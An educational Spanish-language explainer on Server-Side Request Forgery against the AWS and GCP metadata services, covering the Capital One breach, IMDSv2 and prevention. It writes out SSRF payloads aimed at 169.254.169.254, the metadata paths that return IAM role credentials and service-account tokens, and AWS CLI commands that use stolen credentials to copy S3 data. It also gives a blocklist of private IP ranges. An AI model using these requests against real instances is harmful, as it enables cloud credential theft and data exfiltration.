# Objetivo 2: SSRF y el Peligro en la Nube (AWS/GCP)

## Escenario

En infraestructuras Cloud, una vulnerabilidad de **Server-Side Request Forgery (SSRF)** suele ser catastrófica. Este documento explica qué sucede si un atacante encuentra un SSRF en una aplicación alojada en AWS y fuerza al servidor a hacer una petición GET a la dirección mágica `169.254.169.254`, y qué información altamente sensible espera extraer.

---

## 1. Qué es SSRF en 30 segundos

**Server-Side Request Forgery** ocurre cuando la aplicación permite que un atacante controle **a qué URL hace peticiones el servidor**. Ejemplo típico:

```
POST /api/importar-imagen  { "url": "https://ejemplo.com/foto.jpg" }
```

Si el servidor descarga esa URL sin validar, el atacante puede apuntarla hacia adentro:

```
{ "url": "http://localhost/admin" }
{ "url": "http://10.0.0.45:6379/" }
{ "url": "http://169.254.169.254/latest/meta-data/" }
```

La clave: la petición sale **desde dentro de la red privada**, con la identidad y los permisos del servidor. Firewalls que bloquean el exterior no ven nada anómalo: es el propio servidor hablando consigo mismo o con su red interna.

---

## 2. La dirección mágica: 169.254.169.254

### Qué es el Instance Metadata Service (IMDS)

Toda instancia en AWS (EC2, ECS, Lambda con VPC...) tiene acceso a un servicio interno llamado **Instance Metadata Service (IMDS)**, disponible en la IP de link-local:

```
http://169.254.169.254/latest/meta-data/
```

- **169.254.0.0/16** es un rango *link-local*: solo accesible desde la propia máquina, **no enrutable desde Internet**.
- El servicio existe para que la instancia se conozca a sí misma: su ID, región, red, y — lo crítico — **credenciales temporales del rol IAM** asignado.
- Está pensado para que *la propia instancia* consulte su configuración sin necesidad de secretos hardcodeados.

### Por qué SSRF + IMDS es la combinación catastrófica

El SSRF hace que **el servidor** (que sí puede alcanzar `169.254.169.254`, porque está dentro de la instancia) haga la petición por el atacante. Lo que era inaccesible desde internet se vuelve accesible a través del servidor comprometido lógicamente.

---

## 3. Qué extrae el atacante

### a) Metadatos de la instancia

```
GET http://169.254.169.254/latest/meta-data/
```

Información de reconocimiento:

- `instance-id`, `instance-type`, `ami-id`
- `local-ipv4`, `public-ipv4` (mapa de red interno)
- `security-groups` (nombres de grupos de seguridad)
- `iam/info` → **nombre del rol IAM** asociado
- Zona de disponibilidad, región, VPC, subnet

### b) Las credenciales del rol IAM — el premio mayor

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ devuelve el nombre del rol, ej: "app-produccion-role"

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/app-produccion
```

Respuesta:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "FwoGZXIvYXdzE...(session token)",
  "Expiration": "2026-11-16T18:00:00Z"
}
```

Esto es un **set completo de credenciales temporales AWS** (Access Key + Secret + Session Token). Con ellas, el atacante puede usar la **AWS CLI/SDK como si fuera la propia instancia**:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws s3 ls                          # listar buckets
aws s3 cp s3://backups-prod ./     # descargar datos
aws sts get-caller-identity        # confirmar identidad del rol
```

El alcance depende de los **permisos del rol IAM** de la instancia: puede ir desde leer un bucket S3 hasta acceso total a la cuenta (si el rol es demasiado permisivo — muy común).

### c) Otros secretos históricos del IMDS

- **User data** (`/latest/user-data`): scripts de arranque que a menudo contienen claves de API, contraseñas de BD o tokens.
- En versiones antiguas del servicio, credenciales de otros servicios expuestas vía metadatos.

### d) En GCP (equivalente)

```
GET http://metadata.google.internal/computeMetadata/v1/
Header requerido: Metadata-Flavor: Google
```

Devuelve el **token OAuth de la service account** de la instancia:

```
.../instance/service-accounts/default/token
→ {"access_token": "ya29....", "token_type": "Bearer"}
```

Con ese token, el atacante llama a las APIs de Google Cloud con la identidad del service account (GCS, BigQuery, Secret Manager... según permisos).

---

## 4. El caso real que cambió todo: Capital One (2019)

El ejemplo más famoso: una SSRF en un WAF mal configurado permitió a la atacante consultar `169.254.169.254` desde una instancia EC2, **robar las credenciales del rol IAM** y con ellas acceder a más de **100 millones de registros** de clientes en S3. Costo: multa de ~80 millones de dólares y el caso que impulsó la mitigación por defecto de AWS.

---

## 5. La respuesta de AWS: IMDSv2

Porque este ataque es tan frecuente, AWS creó **IMDSv2**, que mitiga el SSRF clásico:

- El primer pedido exige un **método PUT** (los SSRF clásicos solo logran GET) con un header `X-aws-ec2-metadata-token-ttl-seconds`.
- El servidor responde con un **token** que debe enviarse en los pedidos siguientes.
- El navegador/proxy no reenvía headers custom en redirects, y los `GET` simples no obtienen nada.

```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
→ devuelve el token

GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: <token>
```

Un SSRF "simple" (GET forzado) ya no basta: el atacante necesitaría controlar headers y seguir redirects, lo que muchos SSRF no permiten. **Pero IMDSv1 sigue disponible si no se deshabilita explícitamente** — y millones de instancias siguen con v1.

---

## 6. Cómo se previene

1. **Habilitar IMDSv2 y deshabilitar IMDSv1** (`HttpTokens=required`) en todas las instancias — la medida más directa contra este vector.
2. **Saltos de red limitados** (`HttpPutResponseHopLimit=1`): el token IMDS no sobrevive saltos de red, bloqueando SSRF desde contenedores.
3. **Validación estricta de URLs** en cualquier feature que haga fetch server-side: lista blanca de dominios/esquemas, **prohibir IPs** (resolver el dominio y verificar que no sea privada/link-local: `169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `metadata.google.internal`).
4. **No devolver al usuario el contenido** de la petición server-side (evita exfiltración directa).
5. **Segmentación de red**: el servidor de la app no debería poder alcanzar servicios internos que no necesita.
6. **Mínimo privilegio en los roles IAM**: aunque el SSRF ocurra, las credenciales robadas deben dar el mínimo acceso posible.
7. **Monitoreo**: alertar sobre peticiones a `169.254.169.254` en logs de aplicación y uso anómalo de credenciales en CloudTrail.

---

## 7. Resumen

| Elemento | Detalle |
|----------|---------|
| **Dirección** | `169.254.169.254` (link-local, solo accesible desde la instancia) |
| **Qué expone** | Metadatos, user-data, y **credenciales temporales del rol IAM** |
| **Impacto** | El atacante opera en la nube **como la instancia**: S3, bases de datos, secretos, según permisos del rol |
| **Mitigación clave** | IMDSv2 (token vía PUT), mínimo privilegio IAM, bloqueo de IPs link-local en el fetch server-side |

> **Conclusión:** el SSRF en la nube es catastrófico porque convierte al servidor en un **agente interno del atacante**: la IP `169.254.169.254` es inaccesible desde internet, pero el SSRF hace que la propia instancia la consulte y le devuelva el contenido — incluidas **credenciales IAM vivas**. Con ellas, el atacante no solo ve datos: **se convierte en la identidad de la aplicación dentro de la nube**. La defensa combina configuración (IMDSv2, permisos mínimos) y la lección de siempre: validar estrictamente toda URL controlada por el usuario, sin importar cuán inofensiva parezca la funcionalidad.
